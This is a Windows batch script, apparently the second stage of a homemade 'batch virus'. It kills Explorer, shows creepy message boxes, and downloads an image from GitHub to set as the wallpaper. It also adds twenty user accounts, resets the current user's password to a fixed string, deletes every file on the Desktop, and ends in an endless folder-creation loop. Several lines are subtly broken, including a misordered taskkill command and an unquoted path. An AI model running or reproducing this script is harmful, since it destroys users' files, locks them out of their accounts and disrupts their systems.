@echo off

REM Stage 2 intensifies

cd "%systemdrive%\Temp\Microsoft Windows"
taskkill /im /f explorer.exe
echo MsgBox "Uh-oh! It appears an error happened",64," " >> vbsalert2.vbs 
vbsalert2.vbs
curl -O https://github.com/DiamondBroPlayz/batch-virus/blob/main/download.jpg?raw=true
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  C:\Temp\Microsoft Windows\download.jpg /f
explorer.exe
echo MsgBox "the blood, ",64," " >> vbsalert3.vbs 
vbsalert3.vbs
echo MsgBox "HELP",64," " >> vbsalert4.vbs 
vbsalert4
echo MsgBox "...",64," " >> vbsalert5.vbs
vbsalert5.vbs
net user bloodred20 /ADD
net user bloodred19 /ADD
net user bloodred18 /ADD
net user bloodred17 /ADD
net user bloodred16 /ADD
net user bloodred15 /ADD
net user bloodred14 /ADD
net user bloodred13 /ADD
net user bloodred12 /ADD
net user bloodred11 /ADD
net user bloodred10 /ADD
net user bloodred9 /ADD
net user bloodred8 /ADD
net user bloodred7 /ADD
net user bloodred6 /ADD
net user bloodred5 /ADD
net user bloodred4 /ADD
net user bloodred3 /ADD
net user bloodred2 /ADD
net user bloodred1 /ADD
net user  %username%  pq12d*12@
cd C:\Users\%username%\Desktop
del *.*
goto 1
:1
mkdir Blood%random%
goto 1